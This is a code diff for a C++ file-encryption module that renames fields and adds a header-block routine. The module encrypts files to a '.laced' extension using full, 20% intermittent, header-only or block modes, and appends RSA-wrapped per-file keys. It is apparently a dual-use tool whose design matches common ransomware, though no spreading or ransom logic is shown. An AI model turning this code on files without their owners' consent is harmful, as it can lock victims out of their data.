@@ -36,6 +36,9 @@ constexpr unsigned MB = 1048576;
 #define ECRYPT_WNAME_P T(".laced")
 #define ECRYPT_NAME_P ".laced"
 #define ECRYPT_NAME_LEN 6
+#define ECRYPT_VERSION "1.0"
+#define PSIZE_BLOCK 256
+#define HPSIZE_BLOCK 128
 
 #define SET(v,w) ((v) = (w))
 
@@ -82,11 +85,11 @@ static bool EncryptFileFullData(PFILE_INFO FileInfo)
 #else
 	int written = 0;
 #endif
-	DWORD BytesRead = FileInfo->Filesize;
+	DWORD BytesRead = FileInfo->filesize;
 	size_t dwread = 0;
 	DWORD padding = 0;
-	bool isAes = FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256
-		|| FileInfo->CryptInfo->method_policy == CryptoPolicy::RSA_AES256;
+	bool isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
+		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
 	if (isAes && FileInfo->dcrypt == (int)EncryptCipher::CRYPT)
 		padding = aes256_padding(BytesRead) - BytesRead;
 		
@@ -94,35 +97,35 @@ static bool EncryptFileFullData(PFILE_INFO FileInfo)
 	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + AES_BLOCK_SIZE);
 	if (!FileBuffer)
 	{
-		LOG_ERROR("[EncryptFileFullData] Large File Size. Buffer heap crash; %s", FileInfo->Filename);
+		LOG_ERROR("[EncryptFileFullData] Large File Size. Buffer heap crash; %s", FileInfo->filename);
 		goto end;
 	}
 
-	if (!api::ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread))
+	if (!api::ReadFile(FileInfo->filehandle, FileBuffer, BytesRead, &dwread))
 	{
-		LOG_ERROR("[EncryptFileFullData] File is failed to ReadFile; %s", FileInfo->Filename);
+		LOG_ERROR("[EncryptFileFullData] File is failed to ReadFile; %s", FileInfo->filename);
 		goto end;
 	}
 
-	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);
+	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);
 
 	if(isAes && FileInfo->dcrypt == (int)EncryptCipher::DECRYPT)
 	{
-		memory::memzero_explicit(&FileBuffer[FileInfo->Filesize - FileInfo->padding], FileInfo->padding);
-		FileInfo->Filesize -= FileInfo->padding;
+		memory::memzero_explicit(&FileBuffer[FileInfo->filesize - FileInfo->padding], FileInfo->padding);
+		FileInfo->filesize -= FileInfo->padding;
 		BytesRead -= FileInfo->padding;
 	}
 
 	if(GLOBAL_STATE.g_write_in &&
-		(!api::SetPointOff(FileInfo->newFileHandle, 0, SEEK_SET) &&
-		!api::WriteFile(FileInfo->newFileHandle, FileBuffer, BytesRead + padding, &written)))
+		(!api::SetPointOff(FileInfo->recent_filehandle, 0, SEEK_SET) &&
+		!api::WriteFile(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding, &written)))
 	{
 		LOG_ERROR("[EncryptFileFullData] failed;");
 		goto end;
 	}
-	else if (!filesystem::WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
+	else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding))
 	{
-		LOG_ERROR("[EncryptFileFullData] File is failed to write; %s", FileInfo->Filename);
+		LOG_ERROR("[EncryptFileFullData] File is failed to write; %s", FileInfo->filename);
 		goto end;
 	}
 
@@ -157,7 +160,7 @@ static bool EncryptFilePartly
 	LONGLONG PartSize = 0;
 	LONGLONG StepSize = 0;
 	int StepsCount = 0;
-	LONGLONG Size = FileInfo->Filesize;
+	LONGLONG Size = FileInfo->filesize;
 
 	switch (DataPercent)
 	{
@@ -177,13 +180,13 @@ static bool EncryptFilePartly
 		return FALSE;
 	}
 
-	BOOL isAes = FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256
-		|| FileInfo->CryptInfo->method_policy == CryptoPolicy::RSA_AES256;
+	BOOL isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
+		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
 	if (isAes)
 	{
 		if (PartSize < AES_BLOCK_SIZE)
 		{
-			LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->Filename);
+			LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->filename);
 			return FALSE;
 		}
 		multiply = PartSize % 16;
@@ -194,47 +197,47 @@ static bool EncryptFilePartly
 	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
 	if (!BufferPart || !BufferStep)
 	{
-		LOG_ERROR("[EncryptFilePartly] Large File Size. Buffer heap crash; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptFilePartly] Large File Size. Buffer heap crash; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
 	for (int i = 0; i < StepsCount; ++i)
 	{
-		if (!api::ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead) || !BytesRead)
+		if (!api::ReadFile(FileInfo->filehandle, BufferPart, PartSize, &BytesRead) || !BytesRead)
 		{
-			LOG_ERROR("[EncryptFilePartly] Failed File to Read Data; " log_str, FileInfo->FilePath);
+			LOG_ERROR("[EncryptFilePartly] Failed File to Read Data; " log_str, FileInfo->file_path);
 			goto end;
 		}
 
-		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
+		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
 
 		if(GLOBAL_STATE.g_write_in)
 		{
-			if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
-				!api::WriteFile(FileInfo->newFileHandle, BufferPart, BytesRead, &written))
+			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->recent_filehandle, BufferPart, BytesRead, &written))
 				{
 					LOG_ERROR("[EncryptFilePartly] failed;");
 					goto end;
 				}
 			total_write += BytesRead;
 		}
-		else if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
+		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferPart, BytesRead))
 		{
-			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->FilePath);
+			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->file_path);
 			goto end;
 		}
 		TotalRead = 0;
 		while (TotalRead < StepSize)
 		{
-			if (!api::ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
+			if (!api::ReadFile(FileInfo->filehandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
 				break;
 			if(GLOBAL_STATE.g_write_in)
 			{
-				if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
-				!api::WriteFile(FileInfo->newFileHandle, BufferStep, BytesReadW, &written))
+				if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->recent_filehandle, BufferStep, BytesReadW, &written))
 					break;		
 			}
-			else if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
+			else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferStep, BytesReadW))
 				break;
 			TotalRead += BytesReadW;
 			total_write += BytesReadW;
@@ -272,27 +275,27 @@ static bool EncryptFileBlock
 	u32 padding = 0;
 	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE);
 
-	while (api::ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
+	while (api::ReadFile(FileInfo->filehandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
 	{
-		if (BytesRead < 1048576 && FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256)
+		if (BytesRead < 1048576 && FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
 		{
 			padding = BytesRead % 16;
 			BytesRead -= padding;
 		}
 
-		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);
+		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);
 
 		if(GLOBAL_STATE.g_write_in)
 		{
-			if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
-				!api::WriteFile(FileInfo->newFileHandle, Buffer, BytesRead, &written))
+			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesRead, &written))
 				{
 					LOG_ERROR("[EncryptFileBlock] failed;");
 					goto end;
 				}
 			total_write += written;
 		}
-		else if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
+		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead + padding))
 		{
 			LOG_ERROR("[EncryptFileBlock] [WriteFullData] Failed");
 			goto end;
@@ -313,9 +316,9 @@ static bool EncryptFileHeader
 	PFILE_INFO FileInfo
 )
 {
-	if (FileInfo->Filesize < 1048576)
+	if (FileInfo->filesize < 1048576)
 	{
-		LOG_ERROR("[EncryptFileHeader] FileSize must be > 1.0 MB; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptFileHeader] FileSize must be > 1.0 MB; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
@@ -329,13 +332,13 @@ static bool EncryptFileHeader
 		LOG_ERROR("Heap Crash");
 		return FALSE;
 	}
-	if (!api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) || BytesRead != BytesEncrypt)
+	if (!api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) || BytesRead != BytesEncrypt)
 	{
-		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->filename);
 		goto end;
 	}
 
-	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
+	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
 	
 	if(GLOBAL_STATE.g_write_in)
 	{
@@ -344,8 +347,8 @@ static bool EncryptFileHeader
 #else
 		int written = 0;
 #endif
-		if(!api::SetPoint(FileInfo->newFileHandle, SEEK_SET) || 
-			!api::WriteFile(FileInfo->newFileHandle, Buffer, BytesEncrypt, &written))
+		if(!api::SetPoint(FileInfo->recent_filehandle, SEEK_SET) || 
+			!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesEncrypt, &written))
 			{
 				LOG_ERROR("[EncryptFileHeader] failed;");
 				goto end;
@@ -353,15 +356,15 @@ static bool EncryptFileHeader
 	}
 	else
 	{
-		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
+		if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesEncrypt))
 		{
 			LOG_ERROR("[EncryptFileH	eader] [WriteFullData] failed");
 			goto end;
 		}
 
-		while (api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
+		while (api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
 		{
-			if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
+			if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead))
 			{
 				LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
 				goto end;
@@ -382,19 +385,19 @@ end:
 
 bool filesystem::OptionEncryptModeAUTO(PFILE_INFO FileInfo)
 {
-	if (FileInfo->Filesize <= 1048576)
+	if (FileInfo->filesize <= 1048576)
 	{
 		if (!EncryptFileFullData(FileInfo))
 		{
-			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->Filename);
+			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
 			return FALSE;
 		}
 	}
-	else if (FileInfo->Filesize <= 5242880)
+	else if (FileInfo->filesize <= 5242880)
 	{
 		if (!EncryptFilePartly(FileInfo, 20))
 		{
-			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->Filename);
+			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
 			return FALSE;
 		}
 	}
@@ -402,7 +405,7 @@ bool filesystem::OptionEncryptModeAUTO(PFILE_INFO FileInfo)
 	{
 		if (!EncryptFileHeader(FileInfo))
 		{
-			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->Filename);
+			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
 			return FALSE;
 		}
 	}
@@ -414,7 +417,7 @@ bool filesystem::OptionEncryptModeFULL(PFILE_INFO FileInfo)
 {
 	if (!EncryptFileFullData(FileInfo))
 	{
-		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->Filename);
+		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
@@ -425,7 +428,7 @@ bool filesystem::OptionEncryptModePARTLY(PFILE_INFO FileInfo)
 {
 	if (!EncryptFilePartly(FileInfo, 20))
 	{
-		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->Filename);
+		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
@@ -436,7 +439,7 @@ bool filesystem::OptionEncryptModeHEADER(PFILE_INFO FileInfo)
 {
 	if (!EncryptFileHeader(FileInfo))
 	{
-		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->Filename);
+		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
@@ -447,7 +450,7 @@ bool filesystem::OptionEncryptModeBLOCK(PFILE_INFO FileInfo)
 {
 	if (!EncryptFileBlock(FileInfo))
 	{
-		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileBlock]; " log_str, FileInfo->Filename);
+		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileBlock]; " log_str, FileInfo->filename);
 		return FALSE;
 	}
 
@@ -610,25 +613,25 @@ bool filesystem::EncryptRSA
 	bool success = false;
 	bool g_decrypt = FileInfo->dcrypt == (int)EncryptCipher::DECRYPT ? true : false;
 	bool g_crypt = FileInfo->dcrypt == (int)EncryptCipher::CRYPT ? true : false;
-	if (g_crypt && FileInfo->Filesize > FileInfo->CryptInfo->desc.size - 11)
+	if (g_crypt && FileInfo->filesize > FileInfo->crypt_info->desc.size - 11)
 	{
-		LOG_ERROR("[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); " log_str, FileInfo->filename);
 		return false;
 	}
-	else if (g_decrypt && FileInfo->Filesize > FileInfo->CryptInfo->desc.size)
+	else if (g_decrypt && FileInfo->filesize > FileInfo->crypt_info->desc.size)
 	{
-		LOG_ERROR("[EncryptRSA] Invalid Size File < RSA_BYTE; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptRSA] Invalid Size File < RSA_BYTE; " log_str, FileInfo->filename);
 		return false;
 	}
 
 	size_t size = 0;
 	DWORD dwDataLen = 0;
 	BYTE* FileBuffer = NULL;
-	FileBuffer = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
+	FileBuffer = (BYTE*)memory::m_malloc(FileInfo->crypt_info->desc.size);
 	BYTE* Buffer = NULL;
-	if (!api::ReadFile(FileInfo->FileHandle, FileBuffer, FileInfo->Filesize, &size) || FileInfo->Filesize != size)
+	if (!api::ReadFile(FileInfo->filehandle, FileBuffer, FileInfo->filesize, &size) || FileInfo->filesize != size)
 	{
-		LOG_ERROR("[EncryptRSA] Failed File ReadFile; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptRSA] Failed File ReadFile; " log_str, FileInfo->filename);
 		goto END;
 	}
 
@@ -639,13 +642,13 @@ bool filesystem::EncryptRSA
 		(
 			BCryptEncrypt
 			(
-				FileInfo->CryptInfo->desc.handle_rsa_key,
-				FileBuffer, FileInfo->Filesize,
+				FileInfo->crypt_info->desc.handle_rsa_key,
+				FileBuffer, FileInfo->filesize,
 				NULL, NULL, 0,
-				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
+				FileBuffer, FileInfo->crypt_info->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
 			)
 		{
-			LOG_ERROR("[CryptEncrypt] Failed; %ls", FileInfo->Filename);
+			LOG_ERROR("[CryptEncrypt] Failed; %ls", FileInfo->filename);
 			goto END;
 		}
 	}
@@ -655,10 +658,10 @@ bool filesystem::EncryptRSA
 		(
 			BCryptDecrypt
 			(
-				FileInfo->CryptInfo->desc.handle_rsa_key,
-				FileBuffer, FileInfo->CryptInfo->desc.size,
+				FileInfo->crypt_info->desc.handle_rsa_key,
+				FileBuffer, FileInfo->crypt_info->desc.size,
 				NULL, NULL, 0,
-				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen,
+				FileBuffer, FileInfo->crypt_info->desc.size, &dwDataLen,
 				BCRYPT_PAD_PKCS1))
 			)
 		{
@@ -666,7 +669,7 @@ bool filesystem::EncryptRSA
 			goto END;
 		}
 	}
-	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, dwDataLen))
+	if (!WriteFullData(FileInfo->recent_filehandle, FileBuffer, dwDataLen))
 	{
 		LOG_ERROR("[WriteFullData] Failed to write");
 		goto END;
@@ -674,9 +677,9 @@ bool filesystem::EncryptRSA
 #else
 	if (g_crypt && !rsa::EncryptRSA
 	(
-		FileInfo->CryptInfo->desc.bio,
-		FileInfo->CryptInfo->desc.PKEY,
-		FileInfo->CryptInfo->desc.ctx,
+		FileInfo->crypt_info->desc.bio,
+		FileInfo->crypt_info->desc.PKEY,
+		FileInfo->crypt_info->desc.ctx,
 		FileBuffer,
 		&size,
 		&Buffer
@@ -688,9 +691,9 @@ bool filesystem::EncryptRSA
 	}
 	else if (g_decrypt && !rsa::DecryptRSA
 	(
-		FileInfo->CryptInfo->desc.bio,
-		FileInfo->CryptInfo->desc.PKEY,
-		FileInfo->CryptInfo->desc.ctx,
+		FileInfo->crypt_info->desc.bio,
+		FileInfo->crypt_info->desc.PKEY,
+		FileInfo->crypt_info->desc.ctx,
 		FileBuffer,
 		&size,
 		&Buffer
@@ -700,7 +703,7 @@ bool filesystem::EncryptRSA
 		err();
 		goto END;
 	}
-	if (!WriteFullData(FileInfo->newFileHandle, Buffer, size))
+	if (!WriteFullData(FileInfo->recent_filehandle, Buffer, size))
 	{
 		LOG_ERROR("[WriteFullData] Failed to write");
 		goto END;
@@ -712,8 +715,8 @@ bool filesystem::EncryptRSA
 
 END:
 #ifdef __linux__
-	if (FileInfo->CryptInfo->desc.ctx)
-		EVP_PKEY_CTX_free(FileInfo->CryptInfo->desc.ctx);
+	if (FileInfo->crypt_info->desc.ctx)
+		EVP_PKEY_CTX_free(FileInfo->crypt_info->desc.ctx);
 	if (Buffer)
 		memory::m_free(Buffer);
 #endif
@@ -762,7 +765,7 @@ static bool GenKey
 	}
 #endif
 
-	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
+	FileInfo->crypt_info->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
 
 	memory::Copy(EncryptedKey, CryptKey, 32);
 	memory::Copy(EncryptedKey + 32, CryptIV, 8);
@@ -772,10 +775,10 @@ static bool GenKey
 	(
 		BCryptEncrypt
 		(
-			FileInfo->CryptInfo->desc.handle_rsa_key,
+			FileInfo->crypt_info->desc.handle_rsa_key,
 			EncryptedKey, 40,
 			NULL, NULL, 0,
-			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_PKCS1))
+			EncryptedKey, FileInfo->crypt_info->desc.size, &writeData, BCRYPT_PAD_PKCS1))
 		)
 	{
 		LOG_ERROR("[BCryptEncrypt] Failed");
@@ -787,9 +790,9 @@ static bool GenKey
 	BYTE* crypted = NULL;
 	if (!rsa::EncryptRSA
 	(
-		FileInfo->CryptInfo->desc.bio,
-		FileInfo->CryptInfo->desc.PKEY,
-		FileInfo->CryptInfo->desc.ctx,
+		FileInfo->crypt_info->desc.bio,
+		FileInfo->crypt_info->desc.PKEY,
+		FileInfo->crypt_info->desc.ctx,
 		EncryptedKey,
 		&ksize,
 		&crypted
@@ -829,19 +832,19 @@ static bool WriteEncryptInfo
 #ifdef _WIN32
 	LARGE_INTEGER Offset;
 	Offset.QuadPart = 0;
-	if (!SetFilePointerEx(FileInfo->newFileHandle, Offset, NULL, FILE_END)
-		|| !filesystem::WriteFullData(FileInfo->newFileHandle, EncryptedKey, FileInfo->CryptInfo->desc.size)
-		|| !filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, 4))
+	if (!SetFilePointerEx(FileInfo->recent_filehandle, Offset, NULL, FILE_END)
+		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, EncryptedKey, FileInfo->crypt_info->desc.size)
+		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, 4))
 	{
-		LOG_ERROR("[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
+		LOG_ERROR("[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->filename, GetLastError());
 		return FALSE;
 	}
 
 #else
 	int Offset = 0;
-	if (!api::SetPointOff(FileInfo->newFileHandle, Offset, SEEK_END)
-		|| !filesystem::WriteFullData(FileInfo->newFileHandle, EncryptedKey, EKsize)
-		|| !filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, 4))
+	if (!api::SetPointOff(FileInfo->recent_filehandle, Offset, SEEK_END)
+		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, EncryptedKey, EKsize)
+		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, 4))
 	{
 		LOG_ERROR("[WriteEncryptInfo] Failed to set point");
 		return false;
@@ -858,7 +861,7 @@ bool filesystem::FileCryptEncrypt
 {
 	BOOL success = FALSE;
 	EncryptModes mode = GLOBAL_ENUM.g_EncryptMode;
-	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
+	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->crypt_info->desc.size);
 	BYTE CryptIV[8];
 	BYTE CryptKey[32];
 	unsigned ksize;
@@ -869,7 +872,7 @@ bool filesystem::FileCryptEncrypt
 		goto END;
 	}
 
-	if (!FileInfo->CryptInfo->mode_method(FileInfo))
+	if (!FileInfo->crypt_info->mode_method(FileInfo))
 		goto END;
 
 	WriteEncryptInfo(FileInfo, EncryptedKey, ksize, mode);
@@ -878,7 +881,7 @@ bool filesystem::FileCryptEncrypt
 END:
 	if (EncryptedKey)
 	{
-		memory::memzero_explicit(EncryptedKey, FileInfo->CryptInfo->desc.size);
+		memory::memzero_explicit(EncryptedKey, FileInfo->crypt_info->desc.size);
 		memory::memzero_explicit(CryptIV, 8);
 		memory::memzero_explicit(CryptKey, 32);
 		memory::m_free(EncryptedKey);
@@ -967,21 +970,21 @@ bool filesystem::FileCryptDecrypt
 	BYTE* Buffer = NULL;
 	BYTE CryptIV[8];
 	BYTE CryptKey[32];
-	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->FileHandle, &EncryptedKeySize);
+	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->filehandle, &EncryptedKeySize);
 	if (EncryptedKey == NULL)	goto END;
-	FileInfo->Filesize -= EncryptedKeySize + 4;
+	FileInfo->filesize -= EncryptedKeySize + 4;
 	
 #ifdef _WIN32
-	if (SetFilePointer(FileInfo->FileHandle, FileInfo->Filesize, NULL, FILE_BEGIN))
+	if (SetFilePointer(FileInfo->filehandle, FileInfo->filesize, NULL, FILE_BEGIN))
 	{
-		SetEndOfFile(FileInfo->FileHandle);
-		SetFilePointer(FileInfo->FileHandle, 0, NULL, FILE_BEGIN);
+		SetEndOfFile(FileInfo->filehandle);
+		SetFilePointer(FileInfo->filehandle, 0, NULL, FILE_BEGIN);
 	}
 
 	if (!HandleError
 	(
-		BCryptDecrypt(FileInfo->CryptInfo->desc.handle_rsa_key,
-			EncryptedKey, FileInfo->CryptInfo->desc.size,
+		BCryptDecrypt(FileInfo->crypt_info->desc.handle_rsa_key,
+			EncryptedKey, FileInfo->crypt_info->desc.size,
 			NULL, NULL, 0,
 			EncryptedKey, 40, &written,
 			BCRYPT_PAD_PKCS1))
@@ -993,7 +996,7 @@ bool filesystem::FileCryptDecrypt
 	memory::Copy(CryptKey, EncryptedKey, 32);
 	memory::Copy(CryptIV, EncryptedKey + 32, 8);
 #else
-	if (ftruncate(FileInfo->FileHandle, FileInfo->Filesize) == -1)
+	if (ftruncate(FileInfo->filehandle, FileInfo->filesize) == -1)
 	{
 		LOG_ERROR("Failed truncate key");
 		goto END;
@@ -1001,9 +1004,9 @@ bool filesystem::FileCryptDecrypt
 
 	if (!rsa::DecryptRSA
 	(
-		FileInfo->CryptInfo->desc.bio,
-		FileInfo->CryptInfo->desc.PKEY,
-		FileInfo->CryptInfo->desc.ctx,
+		FileInfo->crypt_info->desc.bio,
+		FileInfo->crypt_info->desc.PKEY,
+		FileInfo->crypt_info->desc.ctx,
 		EncryptedKey,
 		&EncryptedKeySize,
 		&Buffer
@@ -1016,9 +1019,9 @@ bool filesystem::FileCryptDecrypt
 	memory::Copy(CryptIV, Buffer + 32, 8);
 #endif
 
-	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
+	FileInfo->crypt_info->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
 
-	success = FileInfo->CryptInfo->mode_method(FileInfo);
+	success = FileInfo->crypt_info->mode_method(FileInfo);
 
 END:
 	if (EncryptedKey)
@@ -1037,6 +1040,47 @@ END:
 #endif
 
 	return success;
+}
+
+static void memcpy_offset(void* pdst, const void* psrc, size_t size, size_t* offset)
+{
+	memcpy(pdst, psrc, size);
+	*offset += size;
+} 
+
+PHEAD_BLOCK filesystem::fill_struct_hblock(DESC recent_handle, const char* crypt_name)
+{
+	PHEAD_BLOCK hblock_t = (PHEAD_BLOCK)memory::m_malloc(sizeof(HEAD_BLOCK));
+	*hblock_t = 
+	{
+		.ctx = (laced_ctx*)memory::m_malloc(sizeof(laced_ctx)),
+		.pblock = (BYTE*)memory::m_malloc(PSIZE_BLOCK),
+		.offset = 0
+	};
+	size_t offset = 0;
+	memcpy_offset(&hblock_t->pblock[offset], "LACEDVAULT", 10, &offset);
+	memcpy_offset(&hblock_t->pblock[offset], ECRYPT_VERSION, 3, &offset);
+	memcpy_offset(&hblock_t->pblock[offset], crypt_name, memory::StrLen(crypt_name), &offset);
+
+#ifdef _WIN32
+	HandleError(BCryptGenRandom(0, &hblock_t->pblock[offset], HPSIZE_BLOCK - offset + 40, BCRYPT_USE_SYSTEM_PREFERRED_RNG));
+#else
+	RAND_bytes(&hblock_t->pblock[offset], HPSIZE_BLOCK - offset + 40);
+#endif
+
+	offset = HPSIZE_BLOCK;
+	ECRYPT_keysetup((laced_ctx*)hblock_t->ctx, &hblock_t->pblock[offset], 256, 64);
+	offset += 32;
+	ECRYPT_ivsetup((laced_ctx*)hblock_t->ctx, &hblock_t->pblock[offset]);
+	offset += 8;
+
+#ifdef _WIN32
+	HandleError(BCryptGenRandom(0, &hblock_t->pblock[offset], PSIZE_BLOCK - offset, BCRYPT_USE_SYSTEM_PREFERRED_RNG));
+#else
+	RAND_bytes(&hblock_t->pblock[offset], PSIZE_BLOCK - offset);
+#endif
+
+	return hblock_t;
 }
 
 STATIC VOID dump_hash(CONST BYTE* hash, size_t len)
